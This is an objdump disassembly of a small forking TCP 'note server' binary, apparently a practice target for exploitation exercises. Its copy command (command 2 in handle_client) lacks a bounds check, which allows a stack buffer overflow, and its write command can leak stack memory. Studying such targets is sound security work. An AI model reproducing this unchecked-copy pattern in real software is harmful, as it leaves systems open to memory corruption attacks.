
c_files/local/note_server:     file format elf64-x86-64


Disassembly of section .init:

0000000000001000 <_init>:
    1000:	48 83 ec 08          	sub    $0x8,%rsp
    1004:	48 8b 05 dd 2f 00 00 	mov    0x2fdd(%rip),%rax        # 3fe8 <__gmon_start__>
    100b:	48 85 c0             	test   %rax,%rax
    100e:	74 02                	je     1012 <_init+0x12>
    1010:	ff d0                	callq  *%rax
    1012:	48 83 c4 08          	add    $0x8,%rsp
    1016:	c3                   	retq   

Disassembly of section .plt:

0000000000001020 <.plt>:
    1020:	ff 35 22 2f 00 00    	pushq  0x2f22(%rip)        # 3f48 <_GLOBAL_OFFSET_TABLE_+0x8>
    1026:	ff 25 24 2f 00 00    	jmpq   *0x2f24(%rip)        # 3f50 <_GLOBAL_OFFSET_TABLE_+0x10>
    102c:	0f 1f 40 00          	nopl   0x0(%rax)

0000000000001030 <sigaction@plt>:
    1030:	ff 25 22 2f 00 00    	jmpq   *0x2f22(%rip)        # 3f58 <sigaction@GLIBC_2.2.5>
    1036:	68 00 00 00 00       	pushq  $0x0
    103b:	e9 e0 ff ff ff       	jmpq   1020 <.plt>

0000000000001040 <setsockopt@plt>:
    1040:	ff 25 1a 2f 00 00    	jmpq   *0x2f1a(%rip)        # 3f60 <setsockopt@GLIBC_2.2.5>
    1046:	68 01 00 00 00       	pushq  $0x1
    104b:	e9 d0 ff ff ff       	jmpq   1020 <.plt>

0000000000001050 <write@plt>:
    1050:	ff 25 12 2f 00 00    	jmpq   *0x2f12(%rip)        # 3f68 <write@GLIBC_2.2.5>
    1056:	68 02 00 00 00       	pushq  $0x2
    105b:	e9 c0 ff ff ff       	jmpq   1020 <.plt>

0000000000001060 <__stack_chk_fail@plt>:
    1060:	ff 25 0a 2f 00 00    	jmpq   *0x2f0a(%rip)        # 3f70 <__stack_chk_fail@GLIBC_2.4>
    1066:	68 03 00 00 00       	pushq  $0x3
    106b:	e9 b0 ff ff ff       	jmpq   1020 <.plt>

0000000000001070 <htons@plt>:
    1070:	ff 25 02 2f 00 00    	jmpq   *0x2f02(%rip)        # 3f78 <htons@GLIBC_2.2.5>
    1076:	68 04 00 00 00       	pushq  $0x4
    107b:	e9 a0 ff ff ff       	jmpq   1020 <.plt>

0000000000001080 <close@plt>:
    1080:	ff 25 fa 2e 00 00    	jmpq   *0x2efa(%rip)        # 3f80 <close@GLIBC_2.2.5>
    1086:	68 05 00 00 00       	pushq  $0x5
    108b:	e9 90 ff ff ff       	jmpq   1020 <.plt>

0000000000001090 <read@plt>:
    1090:	ff 25 f2 2e 00 00    	jmpq   *0x2ef2(%rip)        # 3f88 <read@GLIBC_2.2.5>
    1096:	68 06 00 00 00       	pushq  $0x6
    109b:	e9 80 ff ff ff       	jmpq   1020 <.plt>

00000000000010a0 <inet_addr@plt>:
    10a0:	ff 25 ea 2e 00 00    	jmpq   *0x2eea(%rip)        # 3f90 <inet_addr@GLIBC_2.2.5>
    10a6:	68 07 00 00 00       	pushq  $0x7
    10ab:	e9 70 ff ff ff       	jmpq   1020 <.plt>

00000000000010b0 <memcpy@plt>:
    10b0:	ff 25 e2 2e 00 00    	jmpq   *0x2ee2(%rip)        # 3f98 <memcpy@GLIBC_2.14>
    10b6:	68 08 00 00 00       	pushq  $0x8
    10bb:	e9 60 ff ff ff       	jmpq   1020 <.plt>

00000000000010c0 <listen@plt>:
    10c0:	ff 25 da 2e 00 00    	jmpq   *0x2eda(%rip)        # 3fa0 <listen@GLIBC_2.2.5>
    10c6:	68 09 00 00 00       	pushq  $0x9
    10cb:	e9 50 ff ff ff       	jmpq   1020 <.plt>

00000000000010d0 <bind@plt>:
    10d0:	ff 25 d2 2e 00 00    	jmpq   *0x2ed2(%rip)        # 3fa8 <bind@GLIBC_2.2.5>
    10d6:	68 0a 00 00 00       	pushq  $0xa
    10db:	e9 40 ff ff ff       	jmpq   1020 <.plt>

00000000000010e0 <perror@plt>:
    10e0:	ff 25 ca 2e 00 00    	jmpq   *0x2eca(%rip)        # 3fb0 <perror@GLIBC_2.2.5>
    10e6:	68 0b 00 00 00       	pushq  $0xb
    10eb:	e9 30 ff ff ff       	jmpq   1020 <.plt>

00000000000010f0 <accept@plt>:
    10f0:	ff 25 c2 2e 00 00    	jmpq   *0x2ec2(%rip)        # 3fb8 <accept@GLIBC_2.2.5>
    10f6:	68 0c 00 00 00       	pushq  $0xc
    10fb:	e9 20 ff ff ff       	jmpq   1020 <.plt>

0000000000001100 <exit@plt>:
    1100:	ff 25 ba 2e 00 00    	jmpq   *0x2eba(%rip)        # 3fc0 <exit@GLIBC_2.2.5>
    1106:	68 0d 00 00 00       	pushq  $0xd
    110b:	e9 10 ff ff ff       	jmpq   1020 <.plt>

0000000000001110 <fork@plt>:
    1110:	ff 25 b2 2e 00 00    	jmpq   *0x2eb2(%rip)        # 3fc8 <fork@GLIBC_2.2.5>
    1116:	68 0e 00 00 00       	pushq  $0xe
    111b:	e9 00 ff ff ff       	jmpq   1020 <.plt>

0000000000001120 <socket@plt>:
    1120:	ff 25 aa 2e 00 00    	jmpq   *0x2eaa(%rip)        # 3fd0 <socket@GLIBC_2.2.5>
    1126:	68 0f 00 00 00       	pushq  $0xf
    112b:	e9 f0 fe ff ff       	jmpq   1020 <.plt>

Disassembly of section .plt.got:

0000000000001130 <__cxa_finalize@plt>:
    1130:	ff 25 c2 2e 00 00    	jmpq   *0x2ec2(%rip)        # 3ff8 <__cxa_finalize@GLIBC_2.2.5>
    1136:	66 90                	xchg   %ax,%ax

Disassembly of section .text:

0000000000001140 <_start>:
    1140:	31 ed                	xor    %ebp,%ebp
    1142:	49 89 d1             	mov    %rdx,%r9
    1145:	5e                   	pop    %rsi
    1146:	48 89 e2             	mov    %rsp,%rdx
    1149:	48 83 e4 f0          	and    $0xfffffffffffffff0,%rsp
    114d:	50                   	push   %rax
    114e:	54                   	push   %rsp
    114f:	4c 8d 05 9a 05 00 00 	lea    0x59a(%rip),%r8        # 16f0 <__libc_csu_fini>
    1156:	48 8d 0d 33 05 00 00 	lea    0x533(%rip),%rcx        # 1690 <__libc_csu_init>
    115d:	48 8d 3d 04 03 00 00 	lea    0x304(%rip),%rdi        # 1468 <main>
    1164:	ff 15 76 2e 00 00    	callq  *0x2e76(%rip)        # 3fe0 <__libc_start_main@GLIBC_2.2.5>
    116a:	f4                   	hlt    
    116b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)

0000000000001170 <deregister_tm_clones>:
    1170:	48 8d 3d 99 2e 00 00 	lea    0x2e99(%rip),%rdi        # 4010 <__TMC_END__>
    1177:	48 8d 05 92 2e 00 00 	lea    0x2e92(%rip),%rax        # 4010 <__TMC_END__>
    117e:	48 39 f8             	cmp    %rdi,%rax
    1181:	74 15                	je     1198 <deregister_tm_clones+0x28>
    1183:	48 8b 05 4e 2e 00 00 	mov    0x2e4e(%rip),%rax        # 3fd8 <_ITM_deregisterTMCloneTable>
    118a:	48 85 c0             	test   %rax,%rax
    118d:	74 09                	je     1198 <deregister_tm_clones+0x28>
    118f:	ff e0                	jmpq   *%rax
    1191:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
    1198:	c3                   	retq   
    1199:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)

00000000000011a0 <register_tm_clones>:
    11a0:	48 8d 3d 69 2e 00 00 	lea    0x2e69(%rip),%rdi        # 4010 <__TMC_END__>
    11a7:	48 8d 35 62 2e 00 00 	lea    0x2e62(%rip),%rsi        # 4010 <__TMC_END__>
    11ae:	48 29 fe             	sub    %rdi,%rsi
    11b1:	48 89 f0             	mov    %rsi,%rax
    11b4:	48 c1 ee 3f          	shr    $0x3f,%rsi
    11b8:	48 c1 f8 03          	sar    $0x3,%rax
    11bc:	48 01 c6             	add    %rax,%rsi
    11bf:	48 d1 fe             	sar    %rsi
    11c2:	74 14                	je     11d8 <register_tm_clones+0x38>
    11c4:	48 8b 05 25 2e 00 00 	mov    0x2e25(%rip),%rax        # 3ff0 <_ITM_registerTMCloneTable>
    11cb:	48 85 c0             	test   %rax,%rax
    11ce:	74 08                	je     11d8 <register_tm_clones+0x38>
    11d0:	ff e0                	jmpq   *%rax
    11d2:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
    11d8:	c3                   	retq   
    11d9:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)

00000000000011e0 <__do_global_dtors_aux>:
    11e0:	80 3d 29 2e 00 00 00 	cmpb   $0x0,0x2e29(%rip)        # 4010 <__TMC_END__>
    11e7:	75 2f                	jne    1218 <__do_global_dtors_aux+0x38>
    11e9:	55                   	push   %rbp
    11ea:	48 83 3d 06 2e 00 00 	cmpq   $0x0,0x2e06(%rip)        # 3ff8 <__cxa_finalize@GLIBC_2.2.5>
    11f1:	00 
    11f2:	48 89 e5             	mov    %rsp,%rbp
    11f5:	74 0c                	je     1203 <__do_global_dtors_aux+0x23>
    11f7:	48 8b 3d 0a 2e 00 00 	mov    0x2e0a(%rip),%rdi        # 4008 <__dso_handle>
    11fe:	e8 2d ff ff ff       	callq  1130 <__cxa_finalize@plt>
    1203:	e8 68 ff ff ff       	callq  1170 <deregister_tm_clones>
    1208:	c6 05 01 2e 00 00 01 	movb   $0x1,0x2e01(%rip)        # 4010 <__TMC_END__>
    120f:	5d                   	pop    %rbp
    1210:	c3                   	retq   
    1211:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
    1218:	c3                   	retq   
    1219:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)

0000000000001220 <frame_dummy>:
    1220:	e9 7b ff ff ff       	jmpq   11a0 <register_tm_clones>

0000000000001225 <handle_client>:
    1225:	55                   	push   %rbp
    1226:	48 89 e5             	mov    %rsp,%rbp
    1229:	48 81 ec 30 04 00 00 	sub    $0x430,%rsp
    1230:	89 bd dc fb ff ff    	mov    %edi,-0x424(%rbp)
    1236:	64 48 8b 04 25 28 00 	mov    %fs:0x28,%rax
    123d:	00 00 
    123f:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
    1243:	31 c0                	xor    %eax,%eax
    1245:	66 c7 85 ee fb ff ff 	movw   $0x0,-0x412(%rbp)
    124c:	00 00 
    124e:	48 8d 8d e9 fb ff ff 	lea    -0x417(%rbp),%rcx
    1255:	8b 85 dc fb ff ff    	mov    -0x424(%rbp),%eax
    125b:	ba 01 00 00 00       	mov    $0x1,%edx
    1260:	48 89 ce             	mov    %rcx,%rsi
    1263:	89 c7                	mov    %eax,%edi
    1265:	e8 26 fe ff ff       	callq  1090 <read@plt>
    126a:	48 83 f8 01          	cmp    $0x1,%rax
    126e:	74 0a                	je     127a <handle_client+0x55>
    1270:	bf 01 00 00 00       	mov    $0x1,%edi
    1275:	e8 86 fe ff ff       	callq  1100 <exit@plt>
    127a:	0f b6 85 e9 fb ff ff 	movzbl -0x417(%rbp),%eax
    1281:	0f b6 c0             	movzbl %al,%eax
    1284:	83 f8 03             	cmp    $0x3,%eax
    1287:	0f 84 9f 01 00 00    	je     142c <handle_client+0x207>
    128d:	83 f8 03             	cmp    $0x3,%eax
    1290:	7f bc                	jg     124e <handle_client+0x29>
    1292:	83 f8 01             	cmp    $0x1,%eax
    1295:	74 0e                	je     12a5 <handle_client+0x80>
    1297:	83 f8 02             	cmp    $0x2,%eax
    129a:	0f 84 b1 00 00 00    	je     1351 <handle_client+0x12c>
    12a0:	e9 b7 01 00 00       	jmpq   145c <handle_client+0x237>
    12a5:	48 8d 8d ea fb ff ff 	lea    -0x416(%rbp),%rcx
    12ac:	8b 85 dc fb ff ff    	mov    -0x424(%rbp),%eax
    12b2:	ba 01 00 00 00       	mov    $0x1,%edx
    12b7:	48 89 ce             	mov    %rcx,%rsi
    12ba:	89 c7                	mov    %eax,%edi
    12bc:	e8 cf fd ff ff       	callq  1090 <read@plt>
    12c1:	48 83 f8 01          	cmp    $0x1,%rax
    12c5:	74 0a                	je     12d1 <handle_client+0xac>
    12c7:	bf 01 00 00 00       	mov    $0x1,%edi
    12cc:	e8 2f fe ff ff       	callq  1100 <exit@plt>
    12d1:	0f b7 95 ee fb ff ff 	movzwl -0x412(%rbp),%edx
    12d8:	0f b6 85 ea fb ff ff 	movzbl -0x416(%rbp),%eax
    12df:	0f b6 c0             	movzbl %al,%eax
    12e2:	01 d0                	add    %edx,%eax
    12e4:	3d 00 04 00 00       	cmp    $0x400,%eax
    12e9:	7e 0a                	jle    12f5 <handle_client+0xd0>
    12eb:	bf 01 00 00 00       	mov    $0x1,%edi
    12f0:	e8 0b fe ff ff       	callq  1100 <exit@plt>
    12f5:	0f b6 85 ea fb ff ff 	movzbl -0x416(%rbp),%eax
    12fc:	0f b6 d0             	movzbl %al,%edx
    12ff:	0f b7 85 ee fb ff ff 	movzwl -0x412(%rbp),%eax
    1306:	48 8d 8d f0 fb ff ff 	lea    -0x410(%rbp),%rcx
    130d:	48 98                	cltq   
    130f:	48 01 c1             	add    %rax,%rcx
    1312:	8b 85 dc fb ff ff    	mov    -0x424(%rbp),%eax
    1318:	48 89 ce             	mov    %rcx,%rsi
    131b:	89 c7                	mov    %eax,%edi
    131d:	e8 6e fd ff ff       	callq  1090 <read@plt>
    1322:	0f b6 95 ea fb ff ff 	movzbl -0x416(%rbp),%edx
    1329:	0f b6 d2             	movzbl %dl,%edx
    132c:	48 39 d0             	cmp    %rdx,%rax
    132f:	74 0a                	je     133b <handle_client+0x116>
    1331:	bf 01 00 00 00       	mov    $0x1,%edi
    1336:	e8 c5 fd ff ff       	callq  1100 <exit@plt>
    133b:	0f b6 85 ea fb ff ff 	movzbl -0x416(%rbp),%eax
    1342:	0f b6 c0             	movzbl %al,%eax
    1345:	66 01 85 ee fb ff ff 	add    %ax,-0x412(%rbp)
    134c:	e9 0b 01 00 00       	jmpq   145c <handle_client+0x237>
    1351:	48 8d 8d ec fb ff ff 	lea    -0x414(%rbp),%rcx
    1358:	8b 85 dc fb ff ff    	mov    -0x424(%rbp),%eax
    135e:	ba 02 00 00 00       	mov    $0x2,%edx
    1363:	48 89 ce             	mov    %rcx,%rsi
    1366:	89 c7                	mov    %eax,%edi
    1368:	e8 23 fd ff ff       	callq  1090 <read@plt>
    136d:	48 83 f8 02          	cmp    $0x2,%rax
    1371:	74 0a                	je     137d <handle_client+0x158>
    1373:	bf 01 00 00 00       	mov    $0x1,%edi
    1378:	e8 83 fd ff ff       	callq  1100 <exit@plt>
    137d:	0f b7 85 ec fb ff ff 	movzwl -0x414(%rbp),%eax
    1384:	66 39 85 ee fb ff ff 	cmp    %ax,-0x412(%rbp)
    138b:	73 0a                	jae    1397 <handle_client+0x172>
    138d:	bf 01 00 00 00       	mov    $0x1,%edi
    1392:	e8 69 fd ff ff       	callq  1100 <exit@plt>
    1397:	48 8d 8d eb fb ff ff 	lea    -0x415(%rbp),%rcx
    139e:	8b 85 dc fb ff ff    	mov    -0x424(%rbp),%eax
    13a4:	ba 01 00 00 00       	mov    $0x1,%edx
    13a9:	48 89 ce             	mov    %rcx,%rsi
    13ac:	89 c7                	mov    %eax,%edi
    13ae:	e8 dd fc ff ff       	callq  1090 <read@plt>
    13b3:	48 83 f8 01          	cmp    $0x1,%rax
    13b7:	74 0a                	je     13c3 <handle_client+0x19e>
    13b9:	bf 01 00 00 00       	mov    $0x1,%edi
    13be:	e8 3d fd ff ff       	callq  1100 <exit@plt>
    13c3:	66 81 bd ee fb ff ff 	cmpw   $0x400,-0x412(%rbp)
    13ca:	00 04 
    13cc:	76 0a                	jbe    13d8 <handle_client+0x1b3>
    13ce:	bf 01 00 00 00       	mov    $0x1,%edi
    13d3:	e8 28 fd ff ff       	callq  1100 <exit@plt>
    13d8:	0f b6 85 eb fb ff ff 	movzbl -0x415(%rbp),%eax
    13df:	0f b6 c0             	movzbl %al,%eax
    13e2:	0f b7 95 ec fb ff ff 	movzwl -0x414(%rbp),%edx
    13e9:	0f b7 d2             	movzwl %dx,%edx
    13ec:	48 8d 8d f0 fb ff ff 	lea    -0x410(%rbp),%rcx
    13f3:	48 63 d2             	movslq %edx,%rdx
    13f6:	48 8d 34 11          	lea    (%rcx,%rdx,1),%rsi
    13fa:	0f b7 95 ee fb ff ff 	movzwl -0x412(%rbp),%edx
    1401:	48 8d 8d f0 fb ff ff 	lea    -0x410(%rbp),%rcx
    1408:	48 63 d2             	movslq %edx,%rdx
    140b:	48 01 d1             	add    %rdx,%rcx
    140e:	48 89 c2             	mov    %rax,%rdx
    1411:	48 89 cf             	mov    %rcx,%rdi
    1414:	e8 97 fc ff ff       	callq  10b0 <memcpy@plt>
    1419:	0f b6 85 eb fb ff ff 	movzbl -0x415(%rbp),%eax
    1420:	0f b6 c0             	movzbl %al,%eax
    1423:	66 01 85 ee fb ff ff 	add    %ax,-0x412(%rbp)
    142a:	eb 30                	jmp    145c <handle_client+0x237>
    142c:	0f b7 95 ee fb ff ff 	movzwl -0x412(%rbp),%edx
    1433:	48 8d 8d f0 fb ff ff 	lea    -0x410(%rbp),%rcx
    143a:	8b 85 dc fb ff ff    	mov    -0x424(%rbp),%eax
    1440:	48 89 ce             	mov    %rcx,%rsi
    1443:	89 c7                	mov    %eax,%edi
    1445:	e8 06 fc ff ff       	callq  1050 <write@plt>
    144a:	90                   	nop
    144b:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
    144f:	64 48 33 04 25 28 00 	xor    %fs:0x28,%rax
    1456:	00 00 
    1458:	74 0c                	je     1466 <handle_client+0x241>
    145a:	eb 05                	jmp    1461 <handle_client+0x23c>
    145c:	e9 ed fd ff ff       	jmpq   124e <handle_client+0x29>
    1461:	e8 fa fb ff ff       	callq  1060 <__stack_chk_fail@plt>
    1466:	c9                   	leaveq 
    1467:	c3                   	retq   

0000000000001468 <main>:
    1468:	55                   	push   %rbp
    1469:	48 89 e5             	mov    %rsp,%rbp
    146c:	48 81 ec f0 00 00 00 	sub    $0xf0,%rsp
    1473:	89 bd 1c ff ff ff    	mov    %edi,-0xe4(%rbp)
    1479:	48 89 b5 10 ff ff ff 	mov    %rsi,-0xf0(%rbp)
    1480:	64 48 8b 04 25 28 00 	mov    %fs:0x28,%rax
    1487:	00 00 
    1489:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
    148d:	31 c0                	xor    %eax,%eax
    148f:	48 8d 95 60 ff ff ff 	lea    -0xa0(%rbp),%rdx
    1496:	b8 00 00 00 00       	mov    $0x0,%eax
    149b:	b9 13 00 00 00       	mov    $0x13,%ecx
    14a0:	48 89 d7             	mov    %rdx,%rdi
    14a3:	f3 48 ab             	rep stos %rax,%es:(%rdi)
    14a6:	c7 45 e8 02 00 00 00 	movl   $0x2,-0x18(%rbp)
    14ad:	48 8d 85 60 ff ff ff 	lea    -0xa0(%rbp),%rax
    14b4:	ba 00 00 00 00       	mov    $0x0,%edx
    14b9:	48 89 c6             	mov    %rax,%rsi
    14bc:	bf 11 00 00 00       	mov    $0x11,%edi
    14c1:	e8 6a fb ff ff       	callq  1030 <sigaction@plt>
    14c6:	ba 00 00 00 00       	mov    $0x0,%edx
    14cb:	be 01 00 00 00       	mov    $0x1,%esi
    14d0:	bf 02 00 00 00       	mov    $0x2,%edi
    14d5:	e8 46 fc ff ff       	callq  1120 <socket@plt>
    14da:	89 85 30 ff ff ff    	mov    %eax,-0xd0(%rbp)
    14e0:	83 bd 30 ff ff ff 00 	cmpl   $0x0,-0xd0(%rbp)
    14e7:	79 16                	jns    14ff <main+0x97>
    14e9:	48 8d 3d 18 0b 00 00 	lea    0xb18(%rip),%rdi        # 2008 <_IO_stdin_used+0x8>
    14f0:	e8 eb fb ff ff       	callq  10e0 <perror@plt>
    14f5:	bf 01 00 00 00       	mov    $0x1,%edi
    14fa:	e8 01 fc ff ff       	callq  1100 <exit@plt>
    14ff:	c7 85 2c ff ff ff 01 	movl   $0x1,-0xd4(%rbp)
    1506:	00 00 00 
    1509:	48 8d 95 2c ff ff ff 	lea    -0xd4(%rbp),%rdx
    1510:	8b 85 30 ff ff ff    	mov    -0xd0(%rbp),%eax
    1516:	41 b8 04 00 00 00    	mov    $0x4,%r8d
    151c:	48 89 d1             	mov    %rdx,%rcx
    151f:	ba 02 00 00 00       	mov    $0x2,%edx
    1524:	be 01 00 00 00       	mov    $0x1,%esi
    1529:	89 c7                	mov    %eax,%edi
    152b:	e8 10 fb ff ff       	callq  1040 <setsockopt@plt>
    1530:	85 c0                	test   %eax,%eax
    1532:	79 0c                	jns    1540 <main+0xd8>
    1534:	48 8d 3d e5 0a 00 00 	lea    0xae5(%rip),%rdi        # 2020 <_IO_stdin_used+0x20>
    153b:	e8 a0 fb ff ff       	callq  10e0 <perror@plt>
    1540:	48 8d 85 40 ff ff ff 	lea    -0xc0(%rbp),%rax
    1547:	48 c7 00 00 00 00 00 	movq   $0x0,(%rax)
    154e:	48 c7 40 08 00 00 00 	movq   $0x0,0x8(%rax)
    1555:	00 
    1556:	c7 85 34 ff ff ff 89 	movl   $0x1389,-0xcc(%rbp)
    155d:	13 00 00 
    1560:	66 c7 85 40 ff ff ff 	movw   $0x2,-0xc0(%rbp)
    1567:	02 00 
    1569:	48 8d 3d d0 0a 00 00 	lea    0xad0(%rip),%rdi        # 2040 <_IO_stdin_used+0x40>
    1570:	e8 2b fb ff ff       	callq  10a0 <inet_addr@plt>
    1575:	89 85 44 ff ff ff    	mov    %eax,-0xbc(%rbp)
    157b:	8b 85 34 ff ff ff    	mov    -0xcc(%rbp),%eax
    1581:	0f b7 c0             	movzwl %ax,%eax
    1584:	89 c7                	mov    %eax,%edi
    1586:	e8 e5 fa ff ff       	callq  1070 <htons@plt>
    158b:	66 89 85 42 ff ff ff 	mov    %ax,-0xbe(%rbp)
    1592:	48 8d 8d 40 ff ff ff 	lea    -0xc0(%rbp),%rcx
    1599:	8b 85 30 ff ff ff    	mov    -0xd0(%rbp),%eax
    159f:	ba 10 00 00 00       	mov    $0x10,%edx
    15a4:	48 89 ce             	mov    %rcx,%rsi
    15a7:	89 c7                	mov    %eax,%edi
    15a9:	e8 22 fb ff ff       	callq  10d0 <bind@plt>
    15ae:	85 c0                	test   %eax,%eax
    15b0:	79 16                	jns    15c8 <main+0x160>
    15b2:	48 8d 3d 91 0a 00 00 	lea    0xa91(%rip),%rdi        # 204a <_IO_stdin_used+0x4a>
    15b9:	e8 22 fb ff ff       	callq  10e0 <perror@plt>
    15be:	bf 01 00 00 00       	mov    $0x1,%edi
    15c3:	e8 38 fb ff ff       	callq  1100 <exit@plt>
    15c8:	8b 85 30 ff ff ff    	mov    -0xd0(%rbp),%eax
    15ce:	be 05 00 00 00       	mov    $0x5,%esi
    15d3:	89 c7                	mov    %eax,%edi
    15d5:	e8 e6 fa ff ff       	callq  10c0 <listen@plt>
    15da:	c7 85 2c ff ff ff 10 	movl   $0x10,-0xd4(%rbp)
    15e1:	00 00 00 
    15e4:	48 8d 95 2c ff ff ff 	lea    -0xd4(%rbp),%rdx
    15eb:	48 8d 8d 50 ff ff ff 	lea    -0xb0(%rbp),%rcx
    15f2:	8b 85 30 ff ff ff    	mov    -0xd0(%rbp),%eax
    15f8:	48 89 ce             	mov    %rcx,%rsi
    15fb:	89 c7                	mov    %eax,%edi
    15fd:	e8 ee fa ff ff       	callq  10f0 <accept@plt>
    1602:	89 85 38 ff ff ff    	mov    %eax,-0xc8(%rbp)
    1608:	83 bd 38 ff ff ff 00 	cmpl   $0x0,-0xc8(%rbp)
    160f:	79 16                	jns    1627 <main+0x1bf>
    1611:	48 8d 3d 43 0a 00 00 	lea    0xa43(%rip),%rdi        # 205b <_IO_stdin_used+0x5b>
    1618:	e8 c3 fa ff ff       	callq  10e0 <perror@plt>
    161d:	bf 01 00 00 00       	mov    $0x1,%edi
    1622:	e8 d9 fa ff ff       	callq  1100 <exit@plt>
    1627:	e8 e4 fa ff ff       	callq  1110 <fork@plt>
    162c:	89 85 3c ff ff ff    	mov    %eax,-0xc4(%rbp)
    1632:	83 bd 3c ff ff ff 00 	cmpl   $0x0,-0xc4(%rbp)
    1639:	79 16                	jns    1651 <main+0x1e9>
    163b:	48 8d 3d 29 0a 00 00 	lea    0xa29(%rip),%rdi        # 206b <_IO_stdin_used+0x6b>
    1642:	e8 99 fa ff ff       	callq  10e0 <perror@plt>
    1647:	bf 01 00 00 00       	mov    $0x1,%edi
    164c:	e8 af fa ff ff       	callq  1100 <exit@plt>
    1651:	83 bd 3c ff ff ff 00 	cmpl   $0x0,-0xc4(%rbp)
    1658:	75 24                	jne    167e <main+0x216>
    165a:	8b 85 30 ff ff ff    	mov    -0xd0(%rbp),%eax
    1660:	89 c7                	mov    %eax,%edi
    1662:	e8 19 fa ff ff       	callq  1080 <close@plt>
    1667:	8b 85 38 ff ff ff    	mov    -0xc8(%rbp),%eax
    166d:	89 c7                	mov    %eax,%edi
    166f:	e8 b1 fb ff ff       	callq  1225 <handle_client>
    1674:	bf 00 00 00 00       	mov    $0x0,%edi
    1679:	e8 82 fa ff ff       	callq  1100 <exit@plt>
    167e:	8b 85 38 ff ff ff    	mov    -0xc8(%rbp),%eax
    1684:	89 c7                	mov    %eax,%edi
    1686:	e8 f5 f9 ff ff       	callq  1080 <close@plt>
    168b:	e9 54 ff ff ff       	jmpq   15e4 <main+0x17c>

0000000000001690 <__libc_csu_init>:
    1690:	41 57                	push   %r15
    1692:	4c 8d 3d a7 26 00 00 	lea    0x26a7(%rip),%r15        # 3d40 <__frame_dummy_init_array_entry>
    1699:	41 56                	push   %r14
    169b:	49 89 d6             	mov    %rdx,%r14
    169e:	41 55                	push   %r13
    16a0:	49 89 f5             	mov    %rsi,%r13
    16a3:	41 54                	push   %r12
    16a5:	41 89 fc             	mov    %edi,%r12d
    16a8:	55                   	push   %rbp
    16a9:	48 8d 2d 98 26 00 00 	lea    0x2698(%rip),%rbp        # 3d48 <__do_global_dtors_aux_fini_array_entry>
    16b0:	53                   	push   %rbx
    16b1:	4c 29 fd             	sub    %r15,%rbp
    16b4:	48 83 ec 08          	sub    $0x8,%rsp
    16b8:	e8 43 f9 ff ff       	callq  1000 <_init>
    16bd:	48 c1 fd 03          	sar    $0x3,%rbp
    16c1:	74 1b                	je     16de <__libc_csu_init+0x4e>
    16c3:	31 db                	xor    %ebx,%ebx
    16c5:	0f 1f 00             	nopl   (%rax)
    16c8:	4c 89 f2             	mov    %r14,%rdx
    16cb:	4c 89 ee             	mov    %r13,%rsi
    16ce:	44 89 e7             	mov    %r12d,%edi
    16d1:	41 ff 14 df          	callq  *(%r15,%rbx,8)
    16d5:	48 83 c3 01          	add    $0x1,%rbx
    16d9:	48 39 dd             	cmp    %rbx,%rbp
    16dc:	75 ea                	jne    16c8 <__libc_csu_init+0x38>
    16de:	48 83 c4 08          	add    $0x8,%rsp
    16e2:	5b                   	pop    %rbx
    16e3:	5d                   	pop    %rbp
    16e4:	41 5c                	pop    %r12
    16e6:	41 5d                	pop    %r13
    16e8:	41 5e                	pop    %r14
    16ea:	41 5f                	pop    %r15
    16ec:	c3                   	retq   
    16ed:	0f 1f 00             	nopl   (%rax)

00000000000016f0 <__libc_csu_fini>:
    16f0:	c3                   	retq   

Disassembly of section .fini:

00000000000016f4 <_fini>:
    16f4:	48 83 ec 08          	sub    $0x8,%rsp
    16f8:	48 83 c4 08          	add    $0x8,%rsp
    16fc:	c3                   	retq   
